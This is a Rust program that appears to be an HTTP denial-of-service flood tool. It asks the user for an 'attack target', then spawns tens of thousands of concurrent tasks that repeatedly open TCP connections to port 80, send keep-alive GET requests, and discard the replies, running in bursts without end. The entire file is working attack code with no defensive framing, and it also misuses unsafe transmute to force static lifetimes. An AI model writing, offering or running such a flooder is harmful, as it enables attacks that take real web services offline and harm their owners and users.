use std::{intrinsics::transmute, io::Write, sync::Arc, time::Duration};

use tokio::{io::AsyncWriteExt, sync::Mutex, time::sleep};

const HTTP_REQUEST: &str = "GET / HTTP/1.1\r\nConnection: keep-alive\r\n";

#[tokio::main]
async fn main() -> ! {
    print!("攻撃先: ");
    std::io::stdout().flush().unwrap();
    let mut connect = String::new();
    std::io::stdin().read_line(&mut connect).unwrap();
    let mut connect = connect.trim().to_string();
    let mut http_request = HTTP_REQUEST.to_string();
    http_request.push_str("Host: ");
    http_request.push_str(&connect);
    http_request.push_str("\r\n\r\n");
    let http_request = http_request.as_bytes();
    let http_request = unsafe { transmute::<&[u8], &'static [u8]>(http_request) };
    connect.push_str(":80");
    let connect = unsafe { transmute::<&str, &'static str>(&connect) };

    let attack = move || async move {
        tokio::spawn(async move {
            let (send, mut receive) = tokio::sync::mpsc::channel(1);
            let send = Arc::new(Mutex::new(send));
            loop {
                let mut connect = match tokio::net::TcpStream::connect(connect).await {
                    Ok(o) => o,
                    Err(_) => return,
                };
                let send2 = Arc::clone(&send);

                let a = tokio::spawn(async move {
                    match connect.write_all(http_request).await {
                        Ok(_) => (),
                        Err(_) => return,
                    };
                    let mut a = connect.split();
                    let _ = tokio::io::copy(
                        &mut a.0,
                        &mut match tokio::fs::File::create("/dev/null").await {
                            Ok(o) => o,
                            Err(_) => return,
                        },
                    )
                    .await;
                    let _ = send2.lock().await.send(()).await;
                });

                let send3 = Arc::clone(&send);
                let b = tokio::spawn(async move {
                    sleep(Duration::from_secs(3)).await;
                    let _ = send3.lock().await.send(()).await;
                });

                receive.recv().await;
                a.abort();
                b.abort();
            }
        });
    };

    for _ in 0..10 {
        for _ in 0..10000 {
            attack().await;
        }
        sleep(Duration::from_secs(12)).await;
    }
    loop {
        for _ in 0..1000 {
            attack().await;
        }
        sleep(Duration::from_secs(12)).await
    }
}
